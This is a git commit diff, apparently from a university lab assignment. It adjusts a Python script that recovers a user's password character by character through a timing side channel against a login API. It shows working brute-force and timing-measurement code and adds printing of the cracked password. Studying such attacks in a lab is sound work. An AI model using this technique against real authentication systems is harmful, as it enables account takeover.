bf018c5c789d26faab97f0f6051525011e841004
Moritz <moritz.rfs@gmail.com>
2022-11-14 23:54:40 +0100

    fix session eventually

--- labwork/labworks/labwork07.py
+++ labwork/labworks/labwork07.py
@@ -5,33 +5,35 @@ import sys
 import requests
 
 api_endpoint = sys.argv[1]
-session = requests.Session()
 alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
 def handle_timing_sidechannel(assignment):
+    session = requests.Session()
     user = assignment["user"]
     password = ""
     while True:        
-        char, status = crack_char(user, alphabet, password)
+        char, status = crack_char(user, alphabet, password, session)
         password += char
         if status == "auth_success":
             session.close()
             break
+    print("Password: " + password)
     return {"password": password}
         
-def crack_char(user, alphabet, password):
+def crack_char(user, alphabet, password, session):
     total_stats = []
     for char in alphabet:
         status, time = query_oracle(session, user, password+char)
         if(status == "auth_success"):
             return char, status
-    for i in range(10):
+    for i in range(8):
         char_stats = []
         for char in alphabet:   
             status, time = query_oracle(session, user, password+char+char)
             char_stats.append((char, time))
         char_stats.sort(key=lambda x: x[1], reverse=True)
         total_stats.append(char_stats[0][0])
+    print("cracked char: " + max(set(total_stats), key=total_stats.count))
     return(max(set(total_stats), key=total_stats.count)), status
 
 def query_oracle(session: requests.Session, user: str, password: str) -> str:
